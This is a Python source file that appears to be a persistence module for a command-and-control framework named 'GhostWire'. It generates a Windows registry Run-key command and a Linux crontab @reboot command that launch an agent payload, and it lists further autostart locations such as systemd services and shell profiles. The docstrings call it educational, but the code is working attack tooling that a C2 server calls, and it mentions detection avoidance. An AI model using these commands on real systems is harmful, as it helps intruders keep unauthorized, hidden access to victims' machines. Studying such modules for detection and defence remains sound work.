"""
GhostWire Persistence Module
============================

This module demonstrates common persistence techniques used to maintain
access to target systems across reboots and user sessions. It provides
examples of how attackers might establish long-term access.

Persistence Techniques:
- Windows: Registry Run keys for automatic execution
- Linux: Cron jobs for scheduled execution
- Cross-platform: Startup folder manipulation

Security Implications:
- These techniques can be used by legitimate software for auto-start
- Detection requires monitoring of startup locations and scheduled tasks
- Removal involves cleaning up the established persistence mechanisms

Educational Purpose:
- This module is for authorized testing and educational purposes only
- Understanding these techniques helps improve defensive measures
- Examples demonstrate common persistence vectors that should be monitored

Usage:
    module persistence

Note: This module provides educational examples of persistence techniques.
The commands shown are for demonstration and are not executed automatically.
Real-world persistence requires careful consideration of detection avoidance.
"""
import platform
import os
import io
import sys

class Persistence:
    """
    Establishes persistence using common OS-specific techniques.
    
    This class demonstrates various methods for maintaining access to
    target systems through automatic execution mechanisms. It provides
    educational examples of persistence techniques used in red teaming.
    
    Usage: module persistence
    """
    
    @staticmethod
    def _windows_run_key(payload_path):
        """
        Generate Windows registry command for Run key persistence.
        
        This method creates a registry command that adds an entry to
        HKCU\Software\Microsoft\Windows\CurrentVersion\Run, which
        causes the payload to execute when the user logs in.
        
        Args:
            payload_path: Path to the payload executable/script
            
        Returns:
            str: Registry command for establishing persistence
        """
        return f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v GhostWire /t REG_SZ /d "{payload_path}" /f'

    @staticmethod
    def _linux_cron_job(payload_path):
        """
        Generate Linux cron job command for persistence.
        
        This method creates a cron job that executes the payload
        on system reboot using the @reboot directive.
        
        Args:
            payload_path: Path to the payload script
            
        Returns:
            str: Cron job command for establishing persistence
        """
        return f'(crontab -l 2>/dev/null; echo "@reboot {sys.executable} {payload_path}") | crontab -'

    @staticmethod
    def run_remote(args):
        """
        Main entry point for the persistence module.
        
        This method is called by the C2 framework when the module is executed.
        It generates platform-specific persistence commands for educational
        purposes and demonstrates common persistence techniques.
        
        Args:
            args: Command-line arguments (not used in this module)
            
        Returns:
            str: Complete output with persistence examples
        """
        # Capture stdout to return as string
        old_stdout = sys.stdout
        sys.stdout = captured_output = io.StringIO()
        
        try:
            print(f"[+] Generating persistence commands for {platform.system()}...")
            print("[!] Note: These commands are for demonstration and are not executed automatically.")
            
            # Platform-specific persistence techniques
            if platform.system() == "Windows":
                # Example payload path for Windows
                payload = "C:\\Users\\Public\\ghostwire_agent.exe"
                
                print("\n--- Windows Registry Run Key ---")
                print(f"This technique adds a key to the registry to run a payload on user logon.")
                print(f"Example command to run on target:")
                print(f"  {Persistence._windows_run_key(payload)}")
                
                print(f"\nAlternative locations:")
                print(f"  - HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (System-wide)")
                print(f"  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce")
                print(f"  - Startup folder: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                
            elif platform.system() == "Linux":
                # Example payload path for Linux
                payload = "/home/user/.config/ghostwire_agent.py"
                
                print("\n--- Linux Cron Job (@reboot) ---")
                print(f"This technique adds a cron job to run a payload on system reboot.")
                print(f"Example command to run on target:")
                print(f"  {Persistence._linux_cron_job(payload)}")
                
                print(f"\nAlternative techniques:")
                print(f"  - /etc/rc.local (system-wide startup)")
                print(f"  - ~/.bashrc or ~/.profile (user login)")
                print(f"  - systemd user service (~/.config/systemd/user/)")
                print(f"  - /etc/systemd/system/ (system-wide service)")

            else:
                print(f"[!] Unsupported OS for this module: {platform.system()}")

        except Exception as e:
            print(f"[-] Module execution failed: {e}")
        finally:
            # Restore stdout
            sys.stdout = old_stdout
            
        return captured_output.getvalue()